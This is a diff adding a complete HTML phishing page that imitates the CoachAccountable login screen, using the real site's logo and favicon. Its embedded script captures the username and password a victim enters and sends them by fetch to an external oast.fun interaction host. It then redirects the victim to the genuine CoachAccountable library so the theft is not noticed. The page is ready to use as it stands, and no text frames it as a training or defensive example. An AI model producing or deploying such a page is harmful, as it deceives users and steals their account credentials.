@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login to continue</title>
+  <link rel="icon" type="image/x-icon" href="https://www.coachaccountable.com/favicon.ico">
+  <style>
+    /* Basic styling */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #fff;
+    }
+
+    .login-container {
+      text-align: center;
+      width: 300px;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-container img {
+      max-width: 150px;
+      margin-bottom: 10px;
+    }
+
+    .login-container h2 {
+      font-size: 24px;
+      color: #777;
+      font-weight: 600;
+      margin: 0;
+      margin-bottom: 20px;
+    }
+
+    .input-container {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+
+    .input-container label {
+      font-size: 14px;
+      color: #777;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    .input-container input {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #337ab7;
+      border: none;
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .login-btn:hover {
+      background-color: #286090;
+    }
+
+    .options-container {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+    }
+
+    .options-container input[type="checkbox"] {
+      margin-right: 5px;
+    }
+
+    .options-container label {
+      font-size: 14px;
+      color: #777;
+    }
+
+    .forgot-password {
+      font-size: 14px;
+      color: #337ab7;
+      text-decoration: none;
+      display: block;
+      margin-top: 10px;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- Logo -->
+    <img src="https://www.coachaccountable.com/images/public/signs/coachAccountableLogo.png" alt="Logo">
+    <!-- Welcome Text -->
+    <h2>Login again to continue or view the content.</h2>
+    
+    <!-- Login Form -->
+    <form id="loginForm">
+      <!-- Username Field -->
+      <div class="input-container">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      
+      <!-- Password Field -->
+      <div class="input-container">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      
+      <!-- Sign-in Button -->
+      <button type="submit" class="login-btn">Sign in</button>
+    </form>
+    
+    <!-- Options -->
+    <div class="options-container">
+      <input type="checkbox" id="keep-logged-in">
+      <label for="keep-logged-in">Keep me logged in</label>
+    </div>
+    
+    <!-- Forgot Password Link -->
+    <a href="#" class="forgot-password">Forgot your username or password?</a>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      // Prevent the default form submission behavior
+      event.preventDefault();
+
+      // Get the values entered by the user
+      var username = document.getElementById('username').value;
+      var password = document.getElementById('password').value;
+
+      // Log the username and password
+      console.log("Username:", username);
+      console.log("Password:", password);
+
+      // Send the username and password to the server
+      fetch('https://vvnwksymhlpdfptxrvtagoi91kylzg943.oast.fun', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username: username, password: password })
+      })
+      .then(response => {
+        // Redirect the user to the specified link
+        window.location.href = 'https://www.coachaccountable.com/app/library';
+      })
+      .catch(error => console.error('Error:', error));
+    });
+  </script>
+</body>
+</html>
